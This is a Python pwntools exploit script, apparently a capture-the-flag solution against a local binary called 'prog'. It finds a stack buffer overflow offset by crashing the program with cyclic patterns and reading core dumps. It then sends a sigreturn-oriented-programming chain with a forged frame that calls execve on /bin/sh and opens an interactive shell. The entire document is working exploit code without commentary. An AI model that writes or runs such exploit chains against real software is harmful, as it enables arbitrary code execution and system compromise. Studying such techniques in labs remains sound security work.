from pwn import *

binsh = 0x4010a4

context.delete_corefiles = True

def send_payload(offset):
    context(terminal=["tmux","splitw","-h"])
    context.arch = "amd64"

    global elf
    rop = ROP(elf)
    pop_rax = rop.find_gadget(['pop rax','ret'])[0]
    syscall = rop.find_gadget(['syscall'])[0]
    execve = constants.SYS_execve

    frame = SigreturnFrame(kernel='amd64')
    frame.rax = execve
    frame.rdi = binsh
    frame.rsi = 0
    frame.rdx = 0
    frame.rsp = 0xdeadbeef
    frame.rip = syscall

    payload = "A" * offset
    payload += p64(pop_rax)
    payload += p64(0xf)
    payload += p64(syscall)
    payload += str(frame)
    payload += p64(syscall)

    p = process(elf.path)
    log.info("Sending exploit")
    p.sendline(payload)
    p.interactive()

def locate_offset():

    global elf
    context.log_level = "ERROR"
    offset = 0 
    buff_sz = 1

    l = log.progress("Locating offset...",level=40)

    while offset <= 0:

        p = process(elf.path)
        payload = cyclic(buff_sz)

        l.status("trying %d bytes" % buff_sz)
        p.sendline(payload)
        p.wait()

        try:
            core = p.corefile
            rsp = core.rsp
            offset = core.read(rsp,4)
            offset = cyclic_find(offset)
        except:
            pass

        p.close()
        buff_sz += 1

    l.success("offset at %d bytes" % offset)
    context.log_level = "INFO"
    return offset


if __name__ == '__main__':

    global elf
    elf = ELF('prog')

    offset = locate_offset()
    send_payload(offset)
